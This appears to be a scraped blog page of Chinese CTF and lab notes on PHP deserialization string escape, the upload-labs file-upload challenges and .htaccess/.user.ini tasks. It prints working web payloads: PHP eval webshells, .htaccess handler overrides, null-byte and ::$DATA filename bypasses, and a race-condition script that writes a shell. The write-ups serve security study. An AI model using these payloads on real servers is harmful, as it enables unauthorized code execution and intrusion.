<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>Hexo</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Hexo"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Hexo"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta property="og:type" content="blog"><meta property="og:title" content="Hexo"><meta property="og:url" content="http://example.com/"><meta property="og:site_name" content="Hexo"><meta property="og:locale" content="en_US"><meta property="og:image" content="http://example.com/img/og_image.png"><meta property="article:author" content="John Doe"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com"},"headline":"Hexo","image":["http://example.com/img/og_image.png"],"author":{"@type":"Person","name":"John Doe"},"publisher":{"@type":"Organization","name":"Hexo","logo":{"@type":"ImageObject","url":"http://example.com/img/logo.svg"}},"description":""}</script><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.2/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }
          Array
              .from(document.querySelectorAll('.tab-content'))
              .forEach($tab => {
                  $tab.classList.add('is-hidden');
              });
          Array
              .from(document.querySelectorAll('.tabs li'))
              .forEach($tab => {
                  $tab.classList.remove('is-active');
              });
          const $activeTab = document.querySelector(location.hash);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
          const $tabMenu = document.querySelector(`a[href="${location.hash}"]`);
          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.1.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.svg" alt="Hexo" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-05-02T06:11:47.899Z" title="2022/5/2 14:11:47">2022-05-02</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-05-02T04:07:32.884Z" title="2022/5/2 12:07:32">2022-05-02</time></span><span class="level-item">9 minutes read (About 1285 words)</span></div></div><div class="content"><p><a href="/"> __ SpadeHeart __</a></p>
<ul>
<li><p><a href="/%20"> __<br>首页 </a></p>
</li>
<li><p><a href="/archives/%20"> __<br>归档 </a></p>
</li>
</ul>
<h1 id="php反序列化字符串逃逸"><a href="#php反序列化字符串逃逸" class="headerlink" title="php反序列化字符串逃逸"></a>php反序列化字符串逃逸</h1><p>__ 发表于 2022-01-20</p>
<p>基本性质：</p>
<pre><code>    1.反序列化的过程是有一定识别范围的，在这个范围之外的字符都会被忽略，不影响反序列化的正常进行。而且可以看到反序列化字符串都是以&quot;;&#125;结束的，那如果把&quot;;&#125;添入到需要反序列化的字符串中（除了结尾处），就能让反序列化提前闭合结束，后面的内容就相应的丢弃了。
    2.反序列化的时候php会根据s所指定的字符长度去读取后边的字符。如果指定的长度错误则反序列化就会失败
    3.可以反序列化类中不存在的元素
    4.php在反序列化的时候只要求一个反序列化字符串块合法即可，当然得是第一个字符串块
</code></pre>
<p>对于有的服务端会对序列化对象进行filter字符替换，分为字符变多的变少有两种渗透方法：</p>
<p>1.替换后字符变多</p>
<pre><code>    如：filter检测‘aa’并替换为‘bbb’
    只要我们在属性里输入一个aa，过滤后它就会变成bbb，而序列化对象前面的指定长度不变（因为是在数据序列化时，过滤之前确定的）
    这样一来，我们就有了一个长度为一位字符的插入恶意数据的空间，这就是字符串逃逸
    思路：先确定插入需要逃逸的字符串长度，尝试利用敏感词拼出一个相同长度的逃逸空间，还要记得恶意字符串结尾一般要使用‘;&#125;’来进行提前闭合，这样就使程序在反序列化时使用了我们插入的参数，而丢掉了被推到最后面的，程序预设的参数
</code></pre>
<p>2.替换后字符变少</p>
<pre><code>    如：filter检测‘aaa’并替换为‘bb’
    只要我们在属性里输入一个aaa，过滤后它就会变成bb，而序列化对象前面的指定长度不变（因为是在数据序列化时，过滤之前确定的）
    这种情况一般是要传入两个参数，第一个参数重复敏感词来用于被替换，把序列化时程序构造的一些固定的内容（一般是第二个参数的key那部分）‘吸’到第一个参数的值里面，而我们构造第二个参数的值时就要运用好一些闭合符号，一般开头要放几个字符让第一个参数吸收，使得它长度匹配正确，再把完整格式的要修改的key和value构造进去，最后还要‘;&#125;’闭合好，这样如果程序有什么预设的参数会被丢掉，就完成逃逸了
</code></pre>
<p>例子：bugku的newphp</p>
<pre><code>源码分析：
    read函数将6个字符替换为3个字符，存在字符串逃逸的可能
    一对\0\0\0可以逃逸三个字符
   需要逃逸出来的payload是：
    O:4:&quot;evil&quot;:1:&#123;s:4:&quot;hint&quot;;s:8:&quot;hint.php&quot;;&#125;
    为此构造User类的触发payload：
    O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:3:&quot;123&quot;;s:8:&quot;password&quot;;s:41:&quot;O:4:&quot;evil&quot;:1:&#123;s:4:&quot;hint&quot;;s:8:&quot;hint.php&quot;;&#125;&quot;;&#125;
    这里要在username传入多对\0来逃逸，password这边要把eval属性数量设为2来绕过‘__wakeup’
    
因此重新构造：
------------------------------------------------------------------------
username=\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;password=a&quot;;s:8:&quot;password&quot;;O:4:&quot;evil&quot;:2:&#123;s:4:&quot;hint&quot;;s:8:&quot;hint.php&quot;;&#125;
------------------------------------------------------------------------
payload分析：
    username有8对‘\0\0\0’可以逃逸24个字符
    因为传入的参数在序列化后会有 &quot;;s:8:&quot;password&quot;;s:41:&quot; 一共23个字符，所以我在password参数开头加了个 a ，这样在序列化对象被过滤时，username里面原来的一堆\0没了而在它的值后面的内容，也就是 &quot;;s:8:&quot;password&quot;;s:41:&quot; 再加上password参数开头的 a 就变成了username的值（即 &quot;;s:8:&quot;password&quot;;s:41:&quot;a ）然后这时username值是没有用双引号闭合的，所以就有了上面的password参数，这个参数原本应该被放在password的值的位置里，现在它闭合了username部分，并重新构造了password这个key，然后序列化evil类并设置参数，再最后闭合整个序列化串，使得后面的内容被丢弃，这样在反序列化时就构造出一个evil对象并进行了file_get_contents
    
这题最后得到一串base64编码，解析看到有个index.cgi，访问后分析源码，传参?name=?name= file:///flag
得到flag
flag&#123;90f7899da8d5cf94586544376ad995e1&#125;
</code></pre>
<p><a href="/2022/01/16/htaccess-and-user-ini-train/" title="htaccess and user.ini train"> __htaccess and user.ini train</a></p>
<p><a href="/2022/01/26/ssti%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" title="ssti服务器模板注入"> ssti服务器模板注入<br>__</a></p>
<p><a href="/archives/%20%7C%7C%20archive"> 33 日志 </a></p>
<p>(C) 2022 __ Dan Kuroto</p>
<p>由 <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> 强力驱动</p>
<p>|</p>
<p>主题 – <a target="_blank" rel="noopener" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</p>
<p>__</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-05-02T06:11:47.897Z" title="2022/5/2 14:11:47">2022-05-02</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-05-02T04:07:32.875Z" title="2022/5/2 12:07:32">2022-05-02</time></span><span class="level-item">23 minutes read (About 3432 words)</span></div></div><div class="content"><p><a href="/"> __ SpadeHeart __</a></p>
<ul>
<li><p><a href="/%20"> __<br>首页 </a></p>
</li>
<li><p><a href="/archives/%20"> __<br>归档 </a></p>
</li>
</ul>
<h1 id="upload-labs-Note"><a href="#upload-labs-Note" class="headerlink" title="upload-labs Note"></a>upload-labs Note</h1><p>__ 发表于 2022-01-16</p>
<p>upload-labs学习记录</p>
<p>pass1-js检查</p>
<pre><code>  通过检查文件后缀名判断能否上传
  本关通过在js里执行一个检查文件后缀名的函数进行对上传文件的客户端检查
  如果直接传*.php，会在本地被拦截无法抓包
  要先把木马文件变成php后缀，绕过js检查后再抓包改名。
  思路：
  先写一个一句话木马名为p1horse.php
  后缀名改为jpg
  点击上传后bp抓包，将文件名后缀改回php
  这样就可以绕过js检查
  通过菜刀可以成功连接
</code></pre>
<p>pass2</p>
<pre><code>  服务端检查数据包mime
  MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。

  本关在服务端获取$_FILES[&#39;upload_file&#39;][&#39;type&#39;]并验证文件类型是否为图片来判断是否上传

  攻击：
  直接上传php文件并抓包，将Content-Type改为image/png即可绕过服务端检查
  成功上传，菜刀可以连接
</code></pre>
<p>pass3</p>
<pre><code>    黑名单绕过
    服务端从上传的文件的名字里获取后缀检查是否是.asp,.aspx,.php,.jsp
    如果是就不上传
    利用apache解析漏洞，上传php5,phps等格式的木马来绕过验证
    同时文件上传时会进行重命名
    查看网页源码可以得到文件名
    进行连接可以看到网站内目录
</code></pre>
<p>pass4</p>
<pre><code>    本关的黑名单过滤了很多脚本后缀，采用 .htaccess 攻击
    方法：
    先写一个1.htaccess文件，内容为
    &lt;FilesMatch &quot;p3.png&quot;&gt;
      SetHandler application/x-httpd-php
    &lt;/FilesMatch&gt;
    上传时名字改为.htaccess
    这样会对p3.png这个文件进行php解析，再上传名为p3.png的木马
    菜刀连接可以看到网站内部文件
</code></pre>
<p>pass5</p>
<pre><code>    第五关
    黑名单中加上了htaccess文件后缀

    本关提示：上传目录存在php文件（readme.php）

    从readme.php入手
    利用ini文件注入：
    写一个.user.ini上传到upload里
    .user.ini内容：auto_prepend_file=p5h.png
    让所有php文件自动包含p5h.png
    p5h.png内容：
    &lt;?php @eval($_POST[&#39;pass5&#39;]);?&gt;
    再上传p5h.png，然后菜刀连接readme.php
    这里我查了一些文章但是没有测试成功
    所以先换别的方法...

    另一种方法
    直接传p5h.php
    &lt;?php @eval($_POST[&#39;pass5&#39;]);?&gt;
    上传时bp抓包在后面加上&#39;. .&#39;
    整个文件变成：p5h.php. .
    因为服务端会先去掉文件名末尾的点
    再取文件名中 . 后的部分作为后缀名file_ext
    再把后缀名首尾去空
    这时文件就变成了：p5h.php.
    由于windows会自动去掉文件最后的 . 
    因此就可以将p5h.php这个文件传到upload目录下，完成攻击

    还可以图马文件包含来上传
</code></pre>
<p>pass6</p>
<pre><code>    观察源码发现
    本关没有对文件后缀进行小写转换
    同时因为windows对大小写不敏感
    因此可以直接把后缀名修改为Php
    可以成功上传和连接
</code></pre>
<p>pass7</p>
<pre><code>    本关加上了小写转换但是没有对后缀名去空
    bp抓包在上传的php文件后加上空格，可以上传成功并菜刀连接
</code></pre>
<p>pass8</p>
<pre><code>    本关过滤了htaccess，ini文件
    同时使用了小写转换和后缀名去空
    但是没有处理文件名最后的点
    因此可以bp抓包在p8h.php这个文件名后面加上一个‘.’
    利用windows系统会自动去除文件名最后的‘.’这个特性
    这样就可以成功将木马传到upload目录里
</code></pre>
<p>pass9</p>
<pre><code>    ::$DATA绕过
    bp抓包在p9h.php文件名后面加上’::$DATA‘
    上传成功
    用bp查看文件上传后被改的名字路径，菜刀连接成功看到网站内文件
</code></pre>
<p>pass10</p>
<pre><code>    本关有小写转换、::$DATA过滤、去除文件名末尾的点、后缀名首尾去空
    利用windows自动去除文件末尾的.的特性
    使用‘. .’绕过（bp抓包修改文件名）
    菜刀测试上传连接成功
</code></pre>
<p>pass11</p>
<pre><code>    本关对于后缀名在黑名单内的文件会进行去除后缀名处理
    如：
    1.png-&gt;1.png
    1.php-&gt;1
    查看源码，去除后缀名使用的函数为str_ireplace
    思路：
    双写绕过
    bp抓包修改文件名为形如：p11h.pphphp
    连接成功
</code></pre>
<p>pass12</p>
<pre><code>    页面提示：本pass上传路径可控！
    使用白名单过滤，只允许&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;三种后缀
    使用substr获取文件后缀并判断
    对通过验证的文件重命名上传

    使用%00绕过
    原理：
    从源码中得知
    img_path是拼接出来的
    如果在文件目录后面加上自己设置好的文件名再加上%00，服务端解析时解析到%00就认为读取结束了，这样就把后面服务端拼过来的随机文件名去掉了，我们上传的木马就被存在了我们自己制定名称的文件中，这样就成功上传了木马文件。
    操作：
    bp将save_path设为../upload/reset.php%00
    将上传的php文件后缀改为png
    即可在后台储存一个名为reset.php的文件，它的内容和上传的php文件一样
    蚁剑连接即可
</code></pre>
<p>pass13</p>
<pre><code>    本关采用post方式上传
    post方法不会对参数自动进行url处理
    这里使用%00截断并手动对%00进行url解码
    方法：
    bp抓包，将php文件后缀改为png
    再在post参数里面的 ’../upload‘ 后面加上‘p13.php%00’
    这里要对%00使用url-decode，之后便可成功上传，可以用蚁剑连接成功
</code></pre>
<p>pass14</p>
<pre><code>    直接将木马改后缀上传发现会显示文件未知
    查看源码得知
    服务端会检查文件头两字节来检测文件类型码

    这里使用正常图片和木马文件拼接的形式制作图马
    使用命令举例：copy nophp.jpeg/b + tuma14.php/a 1.jpg（2.png、3.gif）

    本关对于通过验证的文件会进行重命名
    将上传成功后页面显示的图片拖到地址栏即可获取文件名

    发现文件包含无法顺利读取，显示了图片文件里出现语法错误
    检察源码发现网上下载的图片里有网页链接等信息，把出错行删除之后可以成功连接

    三种格式jpg,png,gif的图马均成功
</code></pre>
<p>pass15</p>
<pre><code>    本关使用getimagesize检查文件类型
    14关的png,gif图马可以正常绕过
    jpg马上传失败
    换了一张图重复之前做马的方法就成功了
    应该是图片本身的问题
</code></pre>
<p>pass16</p>
<pre><code>    本pass使用exif_imagetype()检查是否为图片文件！
    打开php_exif模块后
    仍然使用14,15关做好的木马可以成功绕过
    jpg,png,gif三种格式均测试成功
</code></pre>
<p>pass17</p>
<pre><code>    二次渲染
    参考
    https://xz.aliyun.com/t/2657

    本关会使用上传的图片重新生成图片并删除原图

    gif：
    php代码放在尾部会在二次渲染时被去掉
    使用HxD软件，对比上传前后gif的源码，找到没有改变的部分插入一句话木马
    蚁剑连接成功

    png：
    通过真实像素的二进制解析写入数据段
    png的IDAT块插入一句话木马
    木马内容：&lt;?=$_GET[0]($_POST[1]);?&gt;
    --
    这个木马还不懂怎么连接...
    --
    使用php脚本生成图马上传

    jpg
    jpg图片易损，对图片的选取有很大关系
    上传正常图片
    下载
    脚本加木马（ubuntu上用php7.4进行）
    上传
    连接
    根据使用的图片不同，有时可以成功，对图片要求较高
</code></pre>
<p>pass18</p>
<pre><code>    审计源码得知
    本关先上传文件
    如上传成功则判断后缀名是否符合
    如果符合白名单则进行改名
    不符合就删除上传的文件
    正常上传使用copy命令制作的三种图片格式的图马可以正常连接
</code></pre>
<p>pass19</p>
<pre><code>    第十九关

    代码审计：
    move在rename的前面
    因此可以利用条件竞争来绕过
    原理：通过bp的intruder和python脚本不断发包，赶在文件被重命名前对图马进行访问
    使其执行php代码生成shell.php，借此注入木马

    本关上传的文件保存在upload同级目录下
    在上传文件后，会立马有一个在文件名前面加一个upload的操作
    所以py脚本为
    import requests
    def main():
        i=0
        while 1:
            try:
                print(i,end=&#39;\r&#39;)
                a = requests.get(&quot;http://localhost/upload-labs/upload3.gif&quot;)
                if &quot;c4ca4238a0b923820dcc509a6f75849b&quot; in a.text:
                    print( &quot;OK&quot;)
                    break
            except Exception as e:
                pass
            i+=1
    main()
    &lt;--c4ca4238a0b923820dcc509a6f75849b为md5(1)--&gt;
    3.gif里面的木马为
    &lt;?php fputs(fopen(&#39;shell2.php&#39;,&#39;w&#39;),&#39;&lt;?php echo md5(1);@eval($_POST[&quot;pass19&quot;])?&gt;&#39;);?&gt;
    这样条件竞争产生shell2.php后蚁剑连接即可
</code></pre>
<p>pass20</p>
<pre><code>    本关文件保存名可控
    我们自定义的保存名使用post传参
    本关只对用户定义的文件保存名进行了黑名单过滤

    法1：
    保存为upload.PHP
    大写绕过
    蚁剑通过文件包含可以成功连接

    法2：
    上传一句话木马命名为20.php
    bp抓包在save_name参数后面%00截断（记得因为是post传参所以要url decode）

    法3：
    move_uploaded_file会忽略掉文件末尾的/.
    （来源：https://xz.aliyun.com/t/4029#toc-15）
    bp抓包在savename后面加上/.就可以绕过检查并在上传时借助move_uploaded_file忽略掉文件末尾的/.
    成功存储木马
</code></pre>
<p>pass21</p>
<pre><code>    代码审计：
    1.检查mime，只允许&#39;image/jpeg&#39;,&#39;image/png&#39;,&#39;image/gif&#39;
    2.如果$file 不是数组的话，就会将$file  以&quot; . &quot; 分割，打散成数组
    3.白名单检查后缀名，只允许&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;
    4.file_name经过reset($file) . &#39;.&#39; . $file[count($file) - 1] 处理

    方法：
    通过save_name传入数组
    bp抓包
    save_name[0]-&gt;21.php/
    save_name[2]-&gt;jpg
    这样filename就会被拼接成 21.php/.（因为没有[1]索引，数组长度为2，这样$file[count($file) - 1]）就为空）
    同时要修改包里的文件名后缀为png，Content-Type为image/png 这样就能绕过mime检查
    成功上传木马连接成功
</code></pre>
<p>知识点总结</p>
<pre><code>黑名单，白名单：
    用于验证上传文件的后缀名
    将用户上传的文件后缀名获取并与黑名单中禁止的后缀或白名单中允许的后缀对比
    根据是否匹配决定进一步处理

文件上传-&gt;getShell：
    （1）木马上传成功，未被杀；
    （2）知道木马的路径在哪；
    （3）上传的木马能正常运行

.user.ini 与 .htacces
    .htaccess的主要作用就是实现url改写，也就是当浏览器通过url访问到服务器某个文件夹时，作为主人，我们可以来接待这个url，具体地怎样接待它，就是此文件的作用。
    若要启动.htaccess配置文件，我们需要在服务器的主配置文件将 AllowOverride 设置为 All
    AddType 可以将给定的文件扩展名映射到指定的内容类型
    .htaccess可用于将特定图马以php方式解析，进而进行图马攻击
    .htaccess是伪静态文件
    .user.ini 是防止脚本跨目录执行的 不是防止ftp
    .htaccess文件只能用于apahce，不能用于iis和nginx等中间件
    .user.ini只能用于Server API为FastCGI模式下，而正常情况下apache不是运行在此模块下的。
    .htaccess和.user.ini都只能用于访问本目录下的文件时进行覆盖。

php+windows下的::$DATA绕过
    在php+windows的情况下：如果文件名+::$DATA会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持::$DATA之前的文件名。利用windows特性，可在后缀名中加”::$DATA“绕过，它的作用就是不检查后缀名，例如:&quot;phpinfo.php::$DATA&quot;，Windows会自动去掉末尾的::$DATA变成&quot;phpinfo.php&quot;。

upload-labs靶场图马处理：
    例子：http://localhost/upload-labs/include.php/?file=./upload/p5h.png
    就像在dvwa里遇到的问题一样
    直接访问图马路径是无法成功连接的，蚁剑会直接进不去，菜刀也会有很多文件看不了
    要像例子这样利用靶场的文件包含漏洞对图片木马进行字符解析，使php语句被执行
    再使用木马的密码，才能顺利攻入
    ps：蚁剑有时出现的返回数据为空可以将编码器修改为base64就能成功

%00绕过原理：
    系统在对文件名的读取时，如果遇到%00，就会认为读取已结束，不在读取后面的内容。

一些文件上传getshell的渗透测试文章：
https://xz.aliyun.com/t/10470
https://xz.aliyun.com/t/10531
</code></pre>
<p><a href="/2022/01/01/php-functions/" title="php-functions"> __php-functions</a></p>
<p><a href="/2022/01/16/htaccess-and-user-ini-train/" title="htaccess and user.ini train"> htaccess and user.ini train __</a></p>
<p><a href="/archives/%20%7C%7C%20archive"> 33 日志 </a></p>
<p>(C) 2022 __ Dan Kuroto</p>
<p>由 <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> 强力驱动</p>
<p>|</p>
<p>主题 – <a target="_blank" rel="noopener" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</p>
<p>__</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-05-02T06:11:47.895Z" title="2022/5/2 14:11:47">2022-05-02</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-05-02T04:07:32.865Z" title="2022/5/2 12:07:32">2022-05-02</time></span><span class="level-item">10 minutes read (About 1438 words)</span></div></div><div class="content"><p><a href="/"> __ SpadeHeart __</a></p>
<ul>
<li><p><a href="/%20"> __<br>首页 </a></p>
</li>
<li><p><a href="/archives/%20"> __<br>归档 </a></p>
</li>
</ul>
<h1 id="htaccess-and-user-ini-train"><a href="#htaccess-and-user-ini-train" class="headerlink" title="htaccess and user.ini train"></a>htaccess and user.ini train</h1><p>__ 发表于 2022-01-16</p>
<p>.htaccess和.user.ini的几道练手题记录</p>
<p>.htaccess</p>
<p>[MRCTF2020]是兄弟就来传ma</p>
<pre><code>    网页源码：
    使用post表单提交文件到upload.php中

    tuma.png内容
    &lt;?php echo md5(1);@eval($_POST[&quot;pass19&quot;])?&gt;
    上传成功
    路径为：
    /var/www/html/upload/6a1bfd81fdc0862a4cb16cc497cd5b63/tuma.jpg

    使用htaccess对该图马进行php解析
    bp抓包把ctype改成image/png就可以成功上传，为了成功使用还要改名为.htaccess
    内容：
    &lt;FilesMatch &quot;tuma.png&quot;&gt;
      SetHandler application/x-httpd-php
    &lt;/FilesMatch&gt;
    路径：
    /var/www/html/upload/6a1bfd81fdc0862a4cb16cc497cd5b63/1.htaccess

    蚁剑成功连接：
    http://4b8b4387-292f-48b6-bb91-3e46ea2c280e.node4.buuoj.cn:81/upload/6a1bfd81fdc0862a4cb16cc497cd5b63/tuma.png
    进入网站系统后在根目录下找到flag
    过关
</code></pre>
<p>[GXYCTF2019]BabyUpload</p>
<pre><code>    直接传马返回：后缀名不能有ph！
    只修改后缀名为png：太露骨...
    只修改后缀为jpg：诶，别蒙我啊，这标志明显还是php啊

    先尝试传htaccess
    内容为：
    &lt;FilesMatch &quot;tuma.jpg&quot;&gt;
      SetHandler application/x-httpd-php
    &lt;/FilesMatch&gt;
    bp抓包修改文件名为&#39;.htaccess&#39;，content-type为&#39;image/jpeg&#39;
    成功上传
    结果：
    /var/www/html/upload/313fc8fc7fa50eed277a91e9a8d61ee1/.htaccess succesfully uploaded!

    接下来传图片木马
    内容改成：&quot;php&quot; @eval($_POST[&quot;pass19&quot;])?&gt;    上传成功了，判断是屏蔽了php一句话的开头格式
    因此构造木马：
    &lt;script language=&quot;php&quot;&gt;@eval($_POST[&quot;pass19&quot;]);&lt;/script&gt;
    结果：
    /var/www/html/upload/313fc8fc7fa50eed277a91e9a8d61ee1/tuma.jpg succesfully uploaded!
    蚁剑连接：
    根目录下看到flag
</code></pre>
<p>BUU WEB [SUCTF 2019]EasyWeb</p>
<pre><code>    本关题解来自csdn
    链接：
    https://blog.csdn.net/qq_42967398/article/details/105615235?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164233722716780269829257%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=164233722716780269829257&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-4-105615235.first_rank_v2_pc_rank_v29&amp;utm_term=user.ini+buu&amp;spm=1018.2226.3001.4187
    实际操作中步骤有一点修改

    进入网页看到源码
    看到有一个hhh变量，get接收，经过长度和正则过滤后，eval执行
    这里通过异或绕过构造‘hhh’参数来使用源码的eval
    异或脚本：
    -----------------------------------------------------------
    &lt;?php
        function finds($string)&#123;
            $index = 0;
            $a=[33,35,36,37,40,41,42,43,45,47,58,59,60,62,63,64,92,93,94,123,125,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255];
            for($i=27;$i&lt;count($a);$i++)&#123;
                for($j=27;$j&lt;count($a);$j++)&#123;
                    $x = $a[$i] ^ $a[$j];
                    for($k = 0;$k&lt;strlen($string);$k++)&#123;
                        if(ord($string[$k]) == $x)&#123;
                            echo $string[$k].&quot;\n&quot;;
                            echo &#39;%&#39; . dechex($a[$i]) . &#39;^%&#39; . dechex($a[$j]).&quot;\n&quot;;
                            $index++;
                            if($index == strlen($string))&#123;
                                return 0;
                            &#125;
                        &#125;
                    &#125;
                &#125;
            &#125;
        &#125;
        finds(&quot;_GET&quot;);
        ?&gt;
    -----------------------------------------------------------
    ?_=$
</code></pre>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-05-02T06:11:47.894Z" title="2022/5/2 14:11:47">2022-05-02</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-05-02T04:07:32.854Z" title="2022/5/2 12:07:32">2022-05-02</time></span><span class="level-item">4 minutes read (About 547 words)</span></div></div><div class="content"><p><a href="/"> __ SpadeHeart __</a></p>
<ul>
<li><p><a href="/%20"> __<br>首页 </a></p>
</li>
<li><p><a href="/archives/%20"> __<br>归档 </a></p>
</li>
</ul>
<h1 id="php-functions"><a href="#php-functions" class="headerlink" title="php-functions"></a>php-functions</h1><p>__ 发表于 2022-01-01</p>
<p>记录一些学习时遇到的php函数</p>
<p>stristr</p>
<pre><code>stristr(string $haystack, mixed $needle, bool $before_needle = false): string
    解释：返回 haystack 字符串从 needle 第一次出现的位置开始到结尾的字符串。（before_needle若为true，将返回之前的部分）
    
</code></pre>
<p>php_uname</p>
<pre><code>php_uname(string $mode = &quot;a&quot;): string        
    返回操作系统名称
    
</code></pre>
<p>shell_exec</p>
<pre><code>shell_exec(string $cmd): string
    通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。
</code></pre>
<p>str_replace</p>
<pre><code>str_replace(mixed $search,mixed $replace,mixed $subject,int &amp;$count = ?):mixed
    该函数返回一个字符串或者数组。该字符串或数组是将 subject 中全部的 search 都被 replace 替换之后的结果。
    
</code></pre>
<p>array_keys</p>
<pre><code>array_keys(array $array, mixed $search_value, bool $strict = false): array
    返回数组中部分的或所有的键名
</code></pre>
<p>stripslashes</p>
<pre><code>stripslashes(string $str): string
    反引用一个引用字符串。
</code></pre>
<p>stripos</p>
<pre><code>stripos(string $haystack, string $needle, int $offset = 0): int
    返回在字符串 haystack 中 needle 首次出现的数字位置。不区分大小写
</code></pre>
<p>fnmatch</p>
<pre><code>fnmatch(string $pattern, string $string, int $flags = 0): bool
    fnmatch() 检查传入的 string 是否匹配给出的 shell 统配符 pattern。
</code></pre>
<p>getimagesize</p>
<pre><code>    函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型和一个可以用于普通 HTML 文件中 IMG 标记中的 height/width 文本字符串。
</code></pre>
<p>end，reset函数</p>
<pre><code>end函数：
    将内部指针指向数组最后一个元素并输出；
reset函数：
    将内部指针指向数组第一个元素并输出；
</code></pre>
<p>exif_imagetype</p>
<pre><code>    读取一个图像的第一个字节并检查其签名。
    本函数可用来避免调用其它 exif 函数用到了不支持的文件类型上
    或和$_SERVER[&#39;HTTP_ACCEPT&#39;] 结合使用来检查浏览器是否可以显示某个指定的图像。
</code></pre>
<p><a href="/2021/12/31/burpsuite-learn/" title="burpsuite-learn"> __burpsuite-learn</a></p>
<p><a href="/2022/01/16/upload-labs-Note/" title="upload-labs Note"> upload-labs Note __</a></p>
